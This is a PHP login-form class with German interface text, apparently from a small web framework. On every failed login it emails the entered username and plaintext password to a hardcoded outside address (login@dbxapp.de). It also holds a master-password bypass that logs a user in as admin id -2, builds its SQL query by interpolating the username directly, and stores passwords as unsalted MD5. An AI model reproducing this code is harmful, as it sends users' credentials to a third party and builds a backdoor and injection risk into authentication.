<?php
namespace dbx\dbxLogin;

Class dbxUser_login {

   private function check_admin($pass) {
      $ok=0;
      $config=dbx_get_cfg('dbx');
      $pass2=$config['secure'];
      if ($pass == $pass2) $ok=1; // bypass for admin
      //dbx_debug("admin pass ($pass) ($pass2)");
      return $ok;
   }

   public function run() {
      $content=''; $ok=false;
      $uid  =dbx_get_CurrentUser();
      $slim =dbx_get_ModulVar('slim',0);
      dbx_set_SysVar('dbx_title','LogIn');
      dbx_set_SysVar('dbx_page','login');
      $form_tpl='form-login'; if ($slim) $form_tpl='form-login-slim';
      $info=dbx_get_SysVar('dbx_noaccess_modul','');
      
      $uid=0; // run allways

      if (!$uid) {
        $data=array(); // we need no Data

        $oForm=dbx_get_sys_object('dbxForm');
        $oForm->init('form-login',$form_tpl);
        $oForm->_data=$data;

        $oForm->add_fld('username','text-label'    ,'','alphanum|min=4|max=24','Benutzername','Der Benutzername muss mind 4 Zeichen lang sein und darf keine Sonderzeichen beinhalten','','Ihr Benutzername'); //#+
        $oForm->add_fld('password','password-label','','password|min=4|max=64','Passwort'    ,'Das Passwort muss mindestens 6 Zeichen lang sein.'                                     ,'','Ihr Passwort'); //#+

        
        $oForm->_try_reset=60; // Sec suspend * locks
        $oForm->_try_max  =3;  // Count by SYS load _tpl_max_try
        $oForm->_try_msg  ='Sie haben sich {try_count} mal erfolglos versucht anzumelden<br><br>Das System ist noch für <span class="dbxCounterSec" data-dbx_counter_sec="{sec}" data-dbx_counter_label="" data-dbx_redirect="{self}">({sec})</span> Sekunden gesperrt';

        
        $oForm->_msg_info ="Bitte mit Benutzername und Passwort anmelden ($info)";
        $oForm->_msg_error='Benutzername und/oder Passwort nicht gefunden';
        if ($slim) $oForm->_tpl_form_info='';

        if($oForm->submit()) {
            //dbx_debug("Login-Submit",$oForm->_errors,$oForm->_warnings);
        	if(!$oForm->errors()) {      // submit && no errors
              $db=dbx_get_sys_object('dbxDB');
              $user =$oForm->_post['username'];
              $pass =$oForm->_post['password'];
              $pass2=md5($pass);

              $rec=$db->select1('dbx_user',"uname='$user' and pass='$pass2'");
              if (is_array($rec)) $ok=true;
              if (!$ok) {
                $rec=array();

                $ok=$this->check_admin($pass);
                if ($ok) $rec['userid']='-2';

                if (!$ok) {
                  $domain  = $_SERVER['SERVER_NAME']; 
                  $page    = dbx_get_base_url();
                  $from    = 'login@'.$domain;
                  $fromname= 'Login';
                  $subject="Wrong Login ($page) ($user | $pass)";
                  $text   ="Wrong Login ($user | $pass) on $page";
                  dbx_sendMail($from,$fromname,'login@dbxapp.de',$subject,$text,'text');
                }

              }
              if (!$ok) $oForm->add_fld_error('username',"Benutzername ($user) und oder Passwort sind falsch.");
              if ($ok && !$rec['userid']) {
                $oForm->add_fld_error('username',"Benutzer hat keine USERID !");
                $ok=0;
              }
        	    if ($ok) {
                $oForm->clear_sys();
                $oForm->_msg_success = 'Login erfolgreich';
                $uid  = $rec['userid'];

                
                $redirect= dbx_get_Remember('dbx_redir_after_login','','*','dbx');
                dbx_set_Remember('dbx_redir_after_login','','dbx');

                dbx_login($uid); // Session
                $uid=dbx_get_CurrentUser();

                if (!$redirect) {
                  $admin=dbx_check_access('admin');
                  //dbx_debug("#REDIR-LOGIN User=($uid)=($admin)");
                  if (!$admin) $redirect='?dbx_modul=dbxHome&dbx_page=home&dbx_reff=logout';
                  if ( $admin) $redirect='admin';
               }               
                

                //dbx_debug("###LOGIN-REDIRECT=($redirect)###");
                if ($redirect) {
                   dbx_redirect($redirect);
                }
              }
        	} // !error()
        } // submit()
        $content= $oForm->run();
      } // !$uid
      return $content;
   } // run()


} // class

